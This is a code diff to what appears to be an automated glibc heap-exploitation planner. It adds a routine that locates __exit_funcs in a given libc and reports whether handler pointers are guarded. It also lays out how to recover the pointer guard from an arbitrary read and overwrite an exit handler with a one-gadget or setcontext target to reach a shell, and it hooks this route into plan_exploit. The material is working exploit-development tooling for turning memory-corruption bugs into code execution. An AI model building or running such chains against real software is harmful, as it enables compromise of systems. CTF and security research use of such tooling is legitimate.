@@ -450,6 +450,65 @@ def _large_bin_attack(v: Vuln, g: Goal, e: Env):
     return steps, precond
 
 
+def _exit_handlers_verdict(e: Env) -> dict:
+    """Whether a write-what-where can reach a shell through `exit()`'s handler list on this libc.
+
+    `exit()` is the control-flow endpoint this knowledge base did not cover: every other route it
+    reasons about lands through stdio (FSOP) or a saved return address. A write that reaches the
+    handler list is a fourth way to turn a write into a call -- and the one that is left when the
+    FILE structs are unreachable and there is no saved return to overwrite.
+
+    It is a CONDITIONAL verdict, decided from the libc's bytes, because every handler flavor stores
+    its function pointer under glibc's pointer guard. So this is not an overwrite-with-an-address:
+    the stored value must be the guard-encoded form, and the guard is a per-process secret. What
+    makes it reachable anyway is that a write-what-where of this kind arrives WITH the arbitrary
+    read that leaked the libc base -- and `__run_exit_handlers` keeps a registered handler whose
+    cleartext is a known libc offset, so reading that one mangled slot and the known cleartext
+    recovers the guard (the mangling is a fixed, invertible transform). The read is the
+    precondition; without it the route is identification only.
+
+    Returns {ok, located, guarded, exit_funcs, precondition, shape, reason}, with `ok` None
+    (UNKNOWN) when no libc bytes were supplied -- the same discipline as `_large_bin_guard`."""
+    from . import rop
+    if not e.libc_data:
+        return {"ok": None, "located": False, "guarded": None,
+                "glibc": ".".join(str(x) for x in e.glibc),
+                "reason": "no libc bytes supplied, so the exit-handler route is UNKNOWN -- pass "
+                          "Env(libc_data=...) to locate __exit_funcs and read the pointer guard"}
+    t = rop.exit_handlers_targets(e.libc_data)
+    if not t:
+        return {"ok": False, "located": False, "guarded": None,
+                "reason": "could not locate __exit_funcs from exit()'s body in this libc"}
+    guarded = bool(t["guarded"])
+    precondition = (
+        "an arbitrary READ to recover the pointer guard (these primitives arrive with one -- the "
+        "same read that leaks the libc base): read a registered handler's mangled fn slot, whose "
+        "cleartext is a known libc offset, and invert the mangling"
+        if guarded else
+        "none beyond the write -- this libc does not guard exit-handler pointers, so the fn can be "
+        "overwritten with a target address directly")
+    shape = ("recover the guard, encode a target (a one-gadget, or setcontext's register-loading "
+             "entry) into the guarded form, write it over a handler's fn at "
+             "__exit_funcs->fns[i].fn, and let exit() call it"
+             if guarded else
+             "write a target over a handler's fn at __exit_funcs->fns[i].fn and let exit() call it")
+    return {"ok": True, "located": True, "guarded": guarded,
+            "exit_funcs": t["exit_funcs"], "demangle_sites": t["demangle_sites"],
+            "fn_field": t["fn_field"], "entry_stride": t["entry_stride"],
+            "precondition": precondition, "shape": shape,
+            "reason": (f"__exit_funcs located at libc+{t['exit_funcs']:#x}; "
+                       + (f"handler pointers are guarded ({t['demangle_sites']} demangle sites), "
+                          "so the route needs the guard recovered from the paired read"
+                          if guarded else
+                          "handler pointers are NOT guarded on this libc, so the fn is a direct "
+                          "overwrite"))}
+
+
+def exit_handlers_verdict(env: Env) -> dict:
+    """Public entry point for the exit-handler route verdict. See `_exit_handlers_verdict`."""
+    return _exit_handlers_verdict(env)
+
+
 # advisory techniques: preconditions, the primitive yielded, and a full generated chain.
 _ADVISORY = [
     {"technique": "fastbin_dup", "primitive": "arbitrary allocation",
@@ -535,16 +594,25 @@ def plan_exploit(vuln: Vuln, goal: Goal, env: Env | None = None) -> dict:
     of which now carries its own generated op-chain (not just an outline)."""
     env = env or Env()
     advisory = _advisory_for(vuln, env)
+    # The write->CALL layer, surfaced when the goal is control flow: a write-what-where still
+    # needs a consumer to become a call, and `exit()` is one the FSOP helpers in `heap`/`leak`
+    # are peers of. Reported as a verdict (located + precondition + shape), not a push-button
+    # chain, because the pointer guard makes it conditional on the paired read.
+    consumers = []
+    if goal.kind == "control_flow":
+        consumers.append({"consumer": "exit_handlers", **_exit_handlers_verdict(env)})
     for t in TECHNIQUES:
         if t["applies"](vuln, env):
             chain = t["build"](vuln, goal, env)
             chain["advisory_alternatives"] = advisory
+            chain["write_consumers"] = consumers
             chain["vuln"] = {"class": vuln.vclass, "size": vuln.size}
             chain["goal"] = {"kind": goal.kind, "target": hex(goal.target),
                              "value": hex(goal.value)}
             return chain
     if advisory:
         return {"ok": False, "reason": "no auto-generated (push-button) technique applies; "
-                "generated analyst-guided chains below", "advisory_alternatives": advisory}
+                "generated analyst-guided chains below", "advisory_alternatives": advisory,
+                "write_consumers": consumers}
     return {"ok": False, "reason": f"no known heap technique for {vuln.vclass} under "
-            f"glibc {env.glibc}"}
+            f"glibc {env.glibc}", "write_consumers": consumers}
